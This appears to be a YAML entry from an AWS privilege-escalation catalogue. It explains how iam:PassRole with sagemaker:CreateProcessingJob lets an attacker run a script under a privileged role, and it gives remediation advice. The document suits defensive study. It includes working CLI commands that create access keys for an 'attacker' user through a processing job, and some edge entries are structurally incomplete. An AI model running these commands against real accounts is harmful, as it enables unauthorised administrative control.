description: A principal with `iam:PassRole` and `sagemaker:CreateProcessingJob` can create a SageMaker processing job with
  a privileged execution role. Processing jobs can execute arbitrary container code for data processing tasks and access AWS
  APIs with the permissions of the attached IAM role. By creating a processing job with a malicious container or processing
  script, the attacker can execute code with elevated privileges.
prerequisites:
  admin:
  - A role must exist that trusts sagemaker.amazonaws.com to assume it
  - The role must have administrative permissions (e.g., AdministratorAccess)
  - An S3 bucket must be accessible to store input/output data

recommendation: |
  Restrict the `iam:PassRole` permission using the principle of least privilege.

  ```json
  {
    "Effect": "Allow",
    "Action": "iam:PassRole",
    "Resource": "arn:aws:iam::ACCOUNT_ID:role/SpecificSageMakerRole",
    "Condition": {
      "StringEquals": {
        "iam:PassedToService": "sagemaker.amazonaws.com"
      }
    }
  }
  ```

  Additional controls:
  - Restrict `sagemaker:CreateProcessingJob` permissions
  - Monitor CloudTrail for SageMaker processing job creation with privileged roles
  - Use VPC configuration to isolate processing jobs
  - Restrict S3 access for processing data sources
  - Alert on processing jobs with administrative roles being created
  - Use container image signing and validation

  nodes:
  - id: start
    label: Starting Principal
    type: principal
    description: |
      The starting principal (user or role) with `iam:PassRole` and `sagemaker:CreateProcessingJob` permissions. This principal will create a SageMaker processing job with a privileged role attached and execute malicious code within the processing job container.
  - id: processing_job
    label: New SageMaker Processing Job
    type: resource
    description: |
      The newly created SageMaker processing job configured with a malicious processing script. The job is created with `sagemaker:CreateProcessingJob` and uses a privileged IAM role via `iam:PassRole`. Processing jobs execute container code for data processing tasks and can run arbitrary commands with the permissions of the attached role.
  - id: target_role
    label: Existing Role That Trusts the sagemaker Service
    type: resource
    description: |
      The privileged IAM role that is passed to the SageMaker processing job during creation. This role must trust sagemaker.amazonaws.com as a principal in its trust policy. When the processing job executes, it runs with this role's permissions, allowing the malicious script to access AWS APIs.
  - id: execute_script
    label: Execute Malicious Script
    type: action
    color: '#99ccff'
    description: |
      The malicious processing script executes within the SageMaker processing job container with the target role's permissions. The script can perform privileged API calls such as creating access keys, modifying IAM policies, or accessing sensitive resources. The script output can be written to S3 or the processing job logs.
  - id: admin_outcome
    label: Effective Administrator
    type: outcome
    description: |
      If the target role has administrative permissions (AdministratorAccess or equivalent), the attacker gains full administrative access to the AWS account. The malicious script can create access keys for the attacker, modify IAM policies, or directly access any AWS resource.
  - id: partial_outcome
    label: Check for Additional Access
    type: outcome
    color: '#ffeb99'
    description: |
      If the target role has some elevated permissions but not full admin, the attacker gains partial privilege escalation. This could include access to sensitive data (S3, RDS, DynamoDB), the ability to modify specific resources, or permissions that enable additional escalation paths.
  - id: minimal_outcome
    label: No Additional Access
    type: outcome
    color: '#cccccc'
    description: |
      If the target role only has minimal permissions or no interesting permissions, the privilege escalation may not provide meaningful additional access to the attacker. However, even limited access could be useful for reconnaissance.

    description: |
      The attacker creates a SageMaker processing job with a malicious processing script and passes a privileged role to it. The script is uploaded to S3 and configured as the container entrypoint.

      Commands:
      ```bash
      # Create malicious script
      echo '#!/bin/bash
      aws iam create-access-key --user-name attacker
      ' > process.sh && chmod +x process.sh

      # Upload to S3
      aws s3 cp process.sh s3://BUCKET_NAME/processing/process.sh

      # Create processing job
      aws sagemaker create-processing-job \
        --processing-job-name privesc-processing \
        --role-arn arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE \
        --app-specification ImageUri=IMAGE_URI,ContainerEntrypoint=/opt/ml/processing/input/process.sh \
        --processing-inputs '[{"InputName":"code","S3Input":{"S3Uri":"s3://BUCKET_NAME/processing/","LocalPath":"/opt/ml/processing/input","S3DataType":"S3Prefix","S3InputMode":"File"}}]' \
        --processing-outputs '[{"OutputName":"output","S3Output":{"S3Uri":"s3://BUCKET_NAME/output","LocalPath":"/opt/ml/processing/output","S3UploadMode":"EndOfJob"}}]' \
        --processing-resources ClusterConfig={InstanceCount=1,InstanceType=ml.m5.large,VolumeSizeInGB=10}
      ```

      The processing job configuration specifies the malicious script as the container entrypoint.
  - from: processing_job
    to: target_role
    label: Job assumes role
    description: |
      When the SageMaker processing job starts, the SageMaker service automatically assumes the target role on behalf of the processing job. The container code then executes with all the permissions granted to this role.
  - from: target_role
    to: execute_script
    label: Execute processing script
    description: |
      The processing job executes the malicious script with the target role's permissions. The script can access AWS APIs through the role's credentials, which are automatically available to the container via the AWS SDK or environment variables.

      Command to monitor:
      ```bash
      aws sagemaker describe-processing-job --processing-job-name privesc-processing
      ```

      The attacker monitors the job status and retrieves output from S3 or CloudWatch logs.

    label: If role has admin permissions
    branch: A
    condition: admin
    description: |
      If the target role has AdministratorAccess or equivalent administrative permissions, the attacker gains full control over the AWS account. The malicious script can create access keys for the attacker, modify IAM policies to grant persistent access, or directly access any AWS resource.
  - from: execute_script
    to: partial_outcome
    label: If role has some permissions
    branch: B
    condition: some_permissions
    description: |
      If the target role has elevated but non-administrative permissions, the attacker gains partial privilege escalation. This might include access to sensitive data stores (S3 buckets, RDS databases, DynamoDB tables), permissions to modify specific resources, or the ability to pursue additional privilege escalation techniques.
  - from: execute_script
    to: minimal_outcome
    label: If role has minimal permissions
    branch: C
    condition: no_permissions
    description: |
      If the target role only has minimal or non-sensitive permissions, the privilege escalation may not yield meaningful additional access. However, the attacker could still use the processing job for reconnaissance or as part of a multi-step attack chain.
